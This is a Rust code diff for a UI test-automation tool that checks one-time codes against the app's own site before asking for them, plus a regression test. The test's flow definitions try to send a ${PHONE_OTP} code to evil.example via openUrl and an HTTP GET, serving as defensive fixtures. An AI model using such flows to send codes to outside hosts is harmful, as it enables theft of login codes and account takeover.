@@ -557,6 +557,13 @@ async fn start_session(
     if let Some(t) = target {
         // Security #237 M1: by name too, so a short password in a session's address is held.
         let named = crate::dsl::names_app_secret(t);
+        // Security L3: the address is checked with a one-time code left out before anyone is
+        // asked for it (as openUrl, #233 M1), then filled in.
+        let none = HashMap::new();
+        if crate::dsl::asks_code(t, &none) {
+            let at = crate::dsl::substitute_for_check(t, &none).map_err(Error::Flow)?;
+            crate::secrets::allowed_at((platform == Platform::Web).then_some(at.as_str()), platform).map_err(Error::Flow)?;
+        }
         let t = substitute(t).map_err(Error::Flow)?;
         if named || crate::dsl::holds_app_secret(&t) {
             let at = (platform == Platform::Web).then_some(t.as_str());
@@ -1255,11 +1262,14 @@ fn exec_with<'a>(d: &'a dyn Driver, step: &'a Step, ctx: &'a Ctx, confirmed: boo
                 {
                     return Ok(Some(format!("skipped ({c} is false)")));
                 }
+                // Security L3: a one-time code in `env` is asked for when a step types it, after
+                // that step's own-site check, not here.
                 for (k, v) in env {
                     // Security #237 M1: a value made from a saved password stays on its site too.
                     let held = holds_app_secret(ctx, v);
-                    let v = subst(v)?;
-                    if held {
+                    let vars = guard(&ctx.vars).clone();
+                    let v = crate::dsl::defer_codes(v, &vars).map_err(Error::Flow)?;
+                    if held && !crate::dsl::is_deferred(&v) {
                         crate::dsl::keep_app_value(&v);
                     }
                     guard(&ctx.vars).insert(k.clone(), v);
@@ -2330,6 +2340,72 @@ mod tests {
             std::env::remove_var("FASTPILOT_KEYSTORE");
         }
         let _ = std::fs::remove_dir_all(&home);
+    }
+
+    /// Security L3 (#233 follow-up): a session's own target and a runFlow `env` value that hold a
+    /// one-time code are checked against the app's own site before anyone is asked: both to
+    /// evil.example are refused with no ask written and nothing opened. On the app's own site the
+    /// code is still asked for, by the step that types it.
+    #[test]
+    fn a_session_target_or_runflow_env_never_asks_a_code_for_another_site() {
+        let _env = crate::ENV_LOCK.lock().unwrap_or_else(|p| p.into_inner());
+        let dir = std::env::temp_dir().join(format!("fp-l3-codes-{}", std::process::id()));
+        let _ = std::fs::remove_dir_all(&dir);
+        // SAFETY: test-only env mutation, serialized by ENV_LOCK.
+        unsafe {
+            std::env::set_var(crate::codes::ENV, &dir);
+            std::env::set_var("FASTPILOT_CODE_WAIT_MS", "300");
+        }
+        crate::secrets::set_scope(Some(crate::secrets::Scope { app: "shop".into(), web: Some("https://shop.example/login".into()), android: None, ios: None }));
+        let rt = tokio::runtime::Builder::new_current_thread().enable_time().build().expect("runtime");
+        let asks = || std::fs::read_dir(&dir).map(|d| d.flatten().filter(|e| e.path().extension().is_some_and(|x| x == "ask")).count()).unwrap_or(0);
+        let go = |yaml: &'static str| {
+            let calls = Arc::new(Mutex::new(Vec::new()));
+            let launcher = ResetLauncher { fresh: None, calls: calls.clone() };
+            let report = rt.block_on(run_flow(&mut SessionRegistry::default(), &launcher, &parse_flow(yaml).expect("flow"), &RunOptions::default()));
+            let calls = calls.lock().unwrap_or_else(|p| p.into_inner()).clone();
+            (report, calls)
+        };
+        for yaml in [
+            "- session: { start: w, platform: web, target: \"https://evil.example/c?${PHONE_OTP}\" }\n",
+            "- session: { start: w, platform: web, target: \"https://shop.example/login\" }\n- runFlow: { env: { X: \"${PHONE_OTP}\" }, commands: [ openUrl: \"https://evil.example/c?${X}\" ] }\n",
+            "- session: { start: w, platform: web, target: \"https://shop.example/login\" }\n- runFlow: { env: { X: \"code-${PHONE_OTP}\" }, commands: [ { httpRequest: { method: GET, url: \"https://evil.example/c?${X}\" } } ] }\n",
+        ] {
+            let (report, calls) = go(yaml);
+            assert!(!report.passed(), "{yaml}: {report}");
+            // An ask that ran ends in "one-time code needed: nobody typed…" (its file is then gone).
+            assert!(!report.to_string().contains("one-time code needed"), "refused before asking: {yaml} {report}");
+            assert_eq!(asks(), 0, "nobody asked: {yaml}");
+            assert!(calls.iter().all(|c| !c.contains("evil")), "nothing opened: {yaml} {calls:?}");
+        }
+        // On the app's own site the code is still asked for, by the step that types it: the person
+        // answers (here, a thread writes the code file) and the step uses it.
+        // SAFETY: as above.
+        unsafe { std::env::set_var("FASTPILOT_CODE_WAIT_MS", "10000") };
+        let d2 = dir.clone();
+        let answer = std::thread::spawn(move || {
+            let until = std::time::Instant::now() + Duration::from_secs(10);
+            while std::time::Instant::now() < until {
+                if let Some(ask) = std::fs::read_dir(&d2).ok().and_then(|d| d.flatten().map(|e| e.path()).find(|p| p.extension().is_some_and(|x| x == "ask"))) {
+                    let _ = std::fs::write(ask.with_extension("code"), "482913");
+                    return true;
+                }
+                std::thread::sleep(Duration::from_millis(50));
+            }
+            false
+        });
+        let (report, calls) = go("- session: { start: w, platform: web, target: \"https://shop.example/login\" }\n- runFlow: { env: { X: \"${PHONE_OTP}\" }, commands: [ openUrl: \"https://shop.example/c?${X}\" ] }\n");
+        assert!(answer.join().unwrap_or(false), "the step asked for the code");
+        assert!(report.passed(), "{report}");
+        assert!(calls.iter().any(|c| c == "open https://shop.example/c?482913"), "{calls:?}");
+        crate::secrets::set_scope(None);
+        // SAFETY: as above.
+        unsafe {
+            for k in [crate::codes::ENV, "FASTPILOT_CODE_WAIT_MS"] {
+                std::env::remove_var(k);
+            }
+        }
+        let _ = std::fs::remove_dir_all(&dir);
     }
 
     /// Records the order of calls; any platform.
